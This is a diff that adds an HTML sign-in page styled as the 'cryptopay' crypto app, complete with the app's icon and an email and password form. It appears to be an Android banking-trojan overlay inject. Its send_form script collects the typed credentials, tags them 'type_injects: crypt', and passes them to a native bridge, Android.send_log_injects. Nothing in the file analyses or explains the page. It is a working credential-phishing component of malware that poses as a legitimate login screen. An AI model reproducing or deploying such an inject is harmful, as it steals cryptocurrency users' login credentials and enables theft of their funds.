@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>cryptopay</title>
+    <link rel="shortcut icon" href="me.cryptopay.android.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #02a4d5;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+    }
+    .logo {
+text-align: center;
+    background-size: 100%;
+    padding: 0px 0px 0px 0px;
+    background: none;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 0px 0px 0px 0px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 50px;
+    margin: 10px 0px 10px 0px;
+    color: #f1f1f1;
+    text-align: left;
+    outline: none;
+    border: 1px solid #45ccf6;
+    background: none;
+    padding-left: 5px;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #fff;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #5f5f5f;
+    border-radius: 10px;
+}
+input::placeholder {
+    color: #45ccf6;
+    font-size: 15px;
+}
+.pure-material-checkbox {
+    z-index: 0;
+    position: relative;
+    display: inline-block;
+    color: rgba(var(--pure-material-onsurface-rgb, 0, 0, 0), 0.87);
+    font-family: var(--pure-material-font, "Roboto", "Segoe UI", BlinkMacSystemFont, system-ui, -apple-system);
+    font-size: 16px;
+    line-height: 1.5;
+}
+/* Input */
+.pure-material-checkbox > input {
+    appearance: none;
+    -moz-appearance: none;
+    -webkit-appearance: none;
+    z-index: -1;
+    position: absolute;
+    left: -10px;
+    top: -8px;
+    display: block;
+    margin: 0;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    background-color: rgba(var(--pure-material-onsurface-rgb, 0, 0, 0), 0.6);
+    box-shadow: none;
+    outline: none;
+    opacity: 0;
+    transform: scale(1);
+    pointer-events: none;
+    transition: opacity 0.3s, transform 0.2s;
+}
+
+/* Span */
+.pure-material-checkbox > span {
+    display: inline-block;
+    width: 100%;
+    cursor: pointer;
+}
+
+/* Box */
+.pure-material-checkbox > span::before {
+    content: "";
+    display: inline-block;
+    box-sizing: border-box;
+    margin: 3px 11px 3px 1px;
+    border: solid 2px; /* Safari */
+    border-color: rgba(var(--pure-material-onsurface-rgb, 0, 0, 0), 0.6);
+    border-radius: 2px;
+    width: 18px;
+    height: 18px;
+    vertical-align: top;
+    transition: border-color 0.2s, background-color 0.2s;
+}
+
+/* Checkmark */
+.pure-material-checkbox > span::after {
+    content: "";
+    display: block;
+    position: absolute;
+    top: 3px;
+    left: 1px;
+    width: 10px;
+    height: 5px;
+    border: solid 2px transparent;
+    border-right: none;
+    border-top: none;
+    transform: translate(3px, 4px) rotate(-45deg);
+}
+
+/* Checked, Indeterminate */
+.pure-material-checkbox > input:checked,
+.pure-material-checkbox > input:indeterminate {
+    background-color: rgb(var(--pure-material-primary-rgb, 33, 150, 243));
+}
+
+.pure-material-checkbox > input:checked + span::before,
+.pure-material-checkbox > input:indeterminate + span::before {
+    border-color: #e78b02;
+    background-color: #e78b02;
+}
+
+.pure-material-checkbox > input:checked + span::after,
+.pure-material-checkbox > input:indeterminate + span::after {
+    border-color: rgb(var(--pure-material-onprimary-rgb, 255, 255, 255));
+}
+
+.pure-material-checkbox > input:indeterminate + span::after {
+    border-left: none;
+    transform: translate(4px, 3px);
+}
+
+/* Hover, Focus */
+.pure-material-checkbox:hover > input {
+    opacity: 0.04;
+}
+
+.pure-material-checkbox > input:focus {
+    opacity: 0.12;
+}
+
+.pure-material-checkbox:hover > input:focus {
+    opacity: 0.16;
+}
+
+/* Active */
+.pure-material-checkbox > input:active {
+    opacity: 1;
+    transform: scale(0);
+    transition: transform 0s, opacity 0s;
+}
+
+.pure-material-checkbox > input:active + span::before {
+    border-color: rgb(var(--pure-material-primary-rgb, 33, 150, 243));
+}
+
+.pure-material-checkbox > input:checked:active + span::before {
+    border-color: transparent;
+    background-color: rgba(var(--pure-material-onsurface-rgb, 0, 0, 0), 0.6);
+}
+
+/* Disabled */
+.pure-material-checkbox > input:disabled {
+    opacity: 0;
+}
+
+.pure-material-checkbox > input:disabled + span {
+    color: rgba(var(--pure-material-onsurface-rgb, 0, 0, 0), 0.38);
+    cursor: initial;
+}
+
+.pure-material-checkbox > input:disabled + span::before {
+    border-color: currentColor;
+}
+
+.pure-material-checkbox > input:checked:disabled + span::before,
+.pure-material-checkbox > input:indeterminate:disabled + span::before {
+    border-color: transparent;
+    background-color: currentColor;
+}
+</style>
+
+<fieldset id="formtosend">
+
+
+<div class="" id="log" style="display: block;">
+
+<div class="logo" style="">
+
+</div>
+
+<script type="text/javascript">
+    function check() {
+  var inp1 = document.getElementById('email');
+  var inp3 = document.getElementById('password');
+  document.getElementById('auth').disabled = inp1.value &&  inp3.value ? false : "disabled";
+}
+</script>
+
+<style type="text/css">
+    input:disabled {
+        opacity: 0.7;
+    }
+</style>
+
+<div class="area" style="padding: 0px;border-radius: 10px;margin: 0px 20px 0px 20px;height: 180px;">
+
+<span style="display: inline-block;text-align: center;padding-bottom: 30px;padding-top: 30px;color: #fff;font-size: 16px;">Sign in</span>
+
+<span><input type="button" name="sumbit" value="✓" id="auth" onclick="send_form();" disabled="disabled" style="
+    background: none;
+    float: right;
+    display: inline-block;
+    width: auto;
+    font-size: 19px;
+"></span>
+
+    <div id="logn" style="display: block;">
+        <input type="text" name="email" id="email" onkeyup="check()" placeholder="Email">
+        <input type="password" name="password" id="password" onkeyup="check()" placeholder="Password">
+
+
+            </div>
+<span style="color: #fff; padding-top: 145px; display: block; font-size: 13px; font-weight: 600;">Forgot your password?</span>
+
+        <input name="exit" type="hidden" text="true"/>
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+
+function send_form()
+{
+var data = {};
+    data.email = document.getElementById('email').value;
+    data.password = document.getElementById('password').value;
+    data.type_injects = "crypt";
+    data.closed = "close_activity_injects";
+    
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+            Android.send_log_injects(JSON.stringify(data))
+        } catch (err) {}
+    }else{
+        alert(JSON.stringify(data));
+    } 
+}
+</script>
+
+</body>
+</html>
